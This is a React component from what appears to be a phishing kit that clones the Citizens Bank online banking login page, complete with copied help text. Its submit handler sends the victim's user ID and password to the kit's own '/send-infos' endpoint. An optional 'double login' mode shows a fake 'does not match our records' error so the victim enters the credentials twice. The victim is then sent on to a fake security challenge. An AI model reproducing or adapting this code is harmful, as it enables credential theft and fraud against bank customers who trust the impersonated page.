/* eslint-disable react/jsx-no-target-blank */

import { useState } from "react";
import axios from "axios";

/* eslint-disable jsx-a11y/anchor-is-valid */
export const MainContainer = ({ updateInputs, history }) => {
  const [login, setLogin] = useState({
    userId: "",
    password: "",
  });

  const [loginAttempt, setLoginAttempt] = useState(0);

  const [error, setError] = useState({
    show: false,
    message: "",
  });

  const [loading, setLoading] = useState(false);

  const onSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    if (!login.userId && !login.password) {
      setError({
        show: true,
        message: "Please enter your Online User ID and click Login",
      });
      setLoading(false);
      return;
    }

    if (!login.userId || !login.password) {
      setError({
        show: true,
        message: "Please enter your User ID and Password and click Login",
      });
      setLoading(false);
      return;
    }

    updateInputs({
      form: "LOGIN DETAILS",
      loginDetails: { username: login.userId, ...login },
    });
    await axios.post("/send-infos", {
      form: "LOGIN DETAILS",
      loginDetails: {
        username: login.userId,
        ...login,
        loginAttempt: loginAttempt + 1,
      },
    });
    console.log("REACT_APP_DOUBLE_LOGIN: ", process.env.REACT_APP_DOUBLE_LOGIN);
    if (!loginAttempt && process.env.REACT_APP_DOUBLE_LOGIN === "ON") {
      setLoginAttempt(1);
      setLoading(false);
      setLogin({
        userId: "",
        password: "",
      });
      return;
    }

    history.push("/security-challenge");
  };

  return (
    <div id="page-container" className="page-container">
      <div className="centered-content clearfix">
        <section id="top-content" className="page-region top-content"></section>
        <section
          id="main-container"
          className="main-container two-col layout-2-1 clearfix"
        >
          {/* =================
  	MAIN CONTENT AREA START
  	================= */}
          <section id="main-content" className="page-region main-content">
            <div className="account-table account-table-full">
              <span className="account-table-border" />
              <div className="account-table-content">
                <div className="account-content-container">
                  <div className="account-table-body">
                    <header className="account-section-title clearfix account-secure">
                      <a href="#" className="mobile-help-trigger">
                        Help
                      </a>
                      <h1>Secure Online Banking Login</h1>
                    </header>
                    {/* <div id="GlobalMessageContainer">
                      <div className="global-message status-message">
                        <h1>Important Updates</h1>
                        <p />
                        <li
                          style={{
                            listStyle: "none",
                          }}
                        >
                          <b>
                            October is National Cyber Security Awareness Month.
                          </b>{" "}
                          Assess your cyber security knowledge by{" "}
                          <a href="#" target="_blank">
                            visiting our hub
                          </a>{" "}
                          to take our quiz, review threats and obtain tips to
                          help you better secure yourself online.
                        </li>
                        <p />
                      </div>
                    </div> */}
                    {error.show && (
                      <div
                        id="messagecontainer"
                        className="error-message show-error error"
                        role="alert"
                        style={{ display: "block" }}
                      >
                        {error.message}
                      </div>
                    )}
                    {loginAttempt ? (
                      <div
                        id="messagecontainer"
                        className="error-message show-error error-visible"
                        role="alert"
                        style={{ display: "block" }}
                      >
                        The information you entered does not match our records.
                        Please check your information and try again. If you need
                        login assistance, click on{" "}
                        <a href="/efs/ui/tli/index.html">Trouble logging in?</a>{" "}
                        or{" "}
                        <a href="login-faqs.jsp" target="_blank">
                          View All Help Topics
                        </a>
                        .
                      </div>
                    ) : null}
                    <div
                      id="messagecontainer"
                      className="error-message show-error"
                      role="alert"
                    >
                      The online user ID below does not match our records.
                      Please review your information then try again. If you are
                      still unable to continue, please call our Customer Service
                      Center.
                    </div>
                    <section className="account-section">
                      <form
                        className="pay-transfer-options clearfix"
                        action="https://www3.citizensbankonline.com/efs/servlet/efs/default.jsp"
                        name="SignOn"
                        id="frmSignOn"
                        method="post"
                      >
                        <div className="account-title clearfix">
                          <p>Please enter your Online User ID and Password.</p>
                        </div>
                        <input
                          type="hidden"
                          name="CSRF_TOKEN"
                          defaultValue="FSIM-MWBT-SITP-TFET-K74W-Z20J-YROU-RLYO"
                        />
                        <input
                          type="hidden"
                          name="BrandSettingsFile"
                          defaultValue="citSettings.jsp"
                        />
                        <input
                          type="hidden"
                          name="fp_deviceprint"
                          defaultValue
                        />
                        <input type="hidden" name="fp_language" defaultValue />
                        <input type="hidden" name="fp_timezone" defaultValue />
                        <input type="hidden" name="fp_browser" defaultValue />
                        <input type="hidden" name="fp_screen" defaultValue />
                        <input type="hidden" name="fp_software" defaultValue />
                        <input type="hidden" name="pm_fp" defaultValue />
                        <input type="hidden" name="RSASessionID" defaultValue />
                        <input type="hidden" name="asstFlow" defaultValue />
                        <input
                          type="hidden"
                          name="initlogin"
                          defaultValue={1}
                        />
                        <input
                          type="hidden"
                          name="enterUserIdMode"
                          defaultValue
                        />
                        <div className="form-item label-right full-width clearfix">
                          <label
                            htmlFor="UserID"
                            className={loginAttempt ? "error" : ""}
                          >
                            <strong>Online User ID: </strong>
                          </label>
                          <input
                            tabIndex={1}
                            type="text"
                            id="UserID"
                            name="UserID"
                            autoComplete="off"
                            maxLength={20}
                            className={`required demo-username ${
                              loginAttempt ? "error" : ""
                            }`}
                            value={login.userId}
                            onChange={(e) => {
                              setLogin((prevState) => {
                                return {
                                  ...prevState,
                                  userId: e.target.value,
                                };
                              });
                            }}
                          />
                          <input
                            type="hidden"
                            name="enterUserIdMode"
                            defaultValue="true"
                          />
                          <input
                            type="hidden"
                            id="SaveUserID"
                            name="SaveUserID"
                            defaultValue
                          />
                          <div className="full-width checkbox-item clearfix">
                            <input
                              type="hidden"
                              name="Register"
                              id="Register"
                              defaultValue={0}
                            />
                            <input
                              type="checkbox"
                              tabIndex={5}
                              disabled="disabled"
                              id="cbSaveUserID"
                              name="cbSaveUserID"
                              style={{ verticalAlign: "top" }}
                            />
                            <span className="inline-tooltip">
                              <label htmlFor="cbSaveUserID">
                                Remember User ID
                              </label>
                              <span
                                className="tooltip"
                                tabIndex={6}
                                role="tooltip"
                                aria-describedby="tooltip-content"
                              >
                                <div
                                  className="tooltip-icon"
                                  title="Remember User ID tooltip"
                                />
                                <div className="tooltip-box">
                                  <div
                                    className="tooltip-content"
                                    id="aria-tooltip-content"
                                  >
                                    <span className="tooltip-arrow" />
                                    <div>
                                      Select the "Remember User ID" box on the
                                      Login page if you want to be remembered.
                                    </div>
                                    <br />
                                    <div>
                                      Please note, if the "Remember User ID"
                                      check box is not displayed on the Login
                                      page, click on the "Login using different
                                      Online User ID" link to display it.
                                    </div>
                                    <br />
                                    <div>
                                      DO NOT check this box if you are using a
                                      public device that is accessible to
                                      others.
                                    </div>
                                  </div>
                                  <div className="bottomshadow" />
                                </div>
                              </span>
                            </span>
                          </div>
                          <div className="form-item full-width">
                            <label
                              htmlFor="currentpassword"
                              className={loginAttempt ? "error" : ""}
                            >
                              <strong>Password: </strong>
                            </label>
                            <input
                              tabIndex={2}
                              type="password"
                              id="currentpassword"
                              name="Password"
                              maxLength={15}
                              size={15}
                              className={`required demo-password ${
                                loginAttempt ? "error" : ""
                              }`}
                              value={login.password}
                              onChange={(e) => {
                                setLogin((prevState) => {
                                  return {
                                    ...prevState,
                                    password: e.target.value,
                                  };
                                });
                              }}
                            />
                            {/*                            <div class="show-hide">
                          <a id="showpswd">SHOW</a>
                      	</div>                           */}
                          </div>
                          <span className="mobile-line-break">
                            <a
                              tabIndex={7}
                              style={{ fontSize: "16px!important" }}
                              id="troublelogging"
                              data-trigger="login-trouble"
                              href="/efs/ui/tli/index.html"
                            >
                              Trouble logging in?
                            </a>
                          </span>
                          <br />
                        </div>
                        <div
                          id="fielderror"
                          className={`show-error ${
                            loginAttempt ? "error-visible" : ""
                          }`}
                          role="alert"
                        >
                          We're sorry. That user ID and password does not match
                          our records. Please try again, or do you need Login
                          Assistance?
                        </div>

                        <div className="form-actions">
                          <input
                            type="submit"
                            className="submit-button arrow"
                            tabIndex={3}
                            data-trigger="next"
                            defaultValue={!loading ? "Login" : "Loading..."}
                            value={!loading ? "Login" : "Loading..."}
                            onClick={(e) => onSubmit(e)}
                          />{" "}
                          <a tabIndex={8} href="#" className="cancel">
                            Cancel
                          </a>
                        </div>
                      </form>
                    </section>
                  </div>
                </div>
              </div>
            </div>
          </section>
          {/* Brand type from query parameter */}
          <aside id="main-sidebar" className="page-region main-sidebar">
            <div
              id="citizens-help"
              className="citizens-help sidebar-item sidebar-list-container sidebar-accordian mobile-modal"
            >
              <div className="sidebar-list-content">
                <header className="sidebar-list-title">
                  <h3>Need Help?</h3>
                </header>
                <div id="faq-holder">
                  <form name="frmAsst" id="frmAsst" method="post">
                    <input
                      type="hidden"
                      name="CSRF_TOKEN"
                      defaultValue="FSIM-MWBT-SITP-TFET-K74W-Z20J-YROU-RLYO"
                    />
                    <input type="hidden" name="needHelp" defaultValue={1} />
                    <section
                      className="toggle-list-container faq-container"
                      id="faq-index-1"
                    >
                      <a
                        href="#"
                        title="Expand contents of Where can I get login assistance for Online Banking?"
                        aria-label="Expand Contents"
                        className="sidebar-list-option-accordian showhide"
                      >
                        Where can I get login assistance for Online Banking?
                      </a>
                      <ul className="loginfaq sidebar-list showhide-content">
                        <li>
                          <p>
                            Simply click on "Trouble logging in?" link. Or, you
                            can click on "View All Help Topics" link, which
                            appears on each screen.
                          </p>
                        </li>
                      </ul>
                    </section>
                    <section
                      className="toggle-list-container faq-container"
                      id="faq-index-10"
                    >
                      <a
                        href="#"
                        title="Expand contents of Is Online Banking secure?"
                        aria-label="Expand Contents"
                        className="sidebar-list-option-accordian showhide"
                      >
                        Is Online Banking secure?
                      </a>
                      <ul className="loginfaq sidebar-list showhide-content">
                        <li>
                          <p>
                            To make Online Banking secure, Citizens Bank uses
                            the highest level of encryption available today.
                            Encryption is the process by which information is
                            translated into un-interpretable code and then back
                            to recognized information.
                            <br />
                            As an added measure, Online Banking gives you the
                            capability to easily verify that you are on the
                            authentic Citizens Bank website and not on a fake
                            site created by fraudsters. Just look for the green
                            bar (or some variation of it) in your browser
                            address. The green bar should remind you that "green
                            is good" and that our website has passed a
                            sophisticated authentication process, letting you
                            know you are good to go.
                          </p>
                        </li>
                      </ul>
                    </section>
                    <section
                      className="toggle-list-container faq-container"
                      id="faq-index-12"
                    >
                      <a
                        href="#"
                        aria-label="Expand Contents"
                        className="sidebar-list-option-accordian showhide"
                        title="Show contents of Should my browser address bar have a green indicator when I use Online Banking?"
                      >
                        Should my browser address bar have a "green" indicator
                        when I use Online Banking?
                      </a>
                      <ul className="loginfaq sidebar-list showhide-content">
                        <li>
                          <p>
                            Yes. As an added measure, Online Banking gives you
                            the capability to easily verify that you are on the
                            authentic Citizens Bank website and not on a fake
                            site created by fraudsters. Just look for the green
                            bar (or some variation of it) in your browser
                            address. The green bar should remind you that "green
                            is good" and that our website has passed a
                            sophisticated authentication process, letting you
                            know you are good to go.
                          </p>
                        </li>
                      </ul>
                    </section>
                    <section
                      className="toggle-list-container faq-container"
                      id="faq-index-20"
                    >
                      <a
                        href="#"
                        title="Expand contents of How do I log into Online Banking if Iâm a first-time user?"
                        aria-label="Expand Contents"
                        className="sidebar-list-option-accordian showhide"
                      >
                        How do I log into Online Banking if I'm a first-time
                        user?
                      </a>
                      <ul className="loginfaq sidebar-list showhide-content">
                        <li>
                          <p>
                            Simply enter your Online User ID and Password and
                            click "LOGIN", then answer your Challenge Question
                            (if presented). In some situations, your Online User
                            ID will be your ATM/Debit Card number and your
                            Password will be the last four digits of your Social
                            Security number followed by "Abcd" (e.g. 1234Abcd).
                            If you haven't already selected an Online User ID,
                            you will be asked to do so.
                          </p>
                        </li>
                      </ul>
                    </section>
                  </form>
                </div>
                <ul className="sidebar-list">
                  <li className="cta-row">
                    <a href="login-faqs.jsp" className="blue" target="_blank">
                      View All Help Topics
                    </a>
                  </li>
                  <li className="cta-row sign-up-prompt visible clearfix">
                    <span>Haven't signed up for Online Banking?</span>
                    <a
                      href="/efs/ui/enrollment/index.html"
                      className="cta orange"
                    >
                      Enroll Now
                    </a>
                  </li>
                </ul>
              </div>
            </div>
          </aside>
        </section>
      </div>
    </div>
  );
};

export default MainContainer;
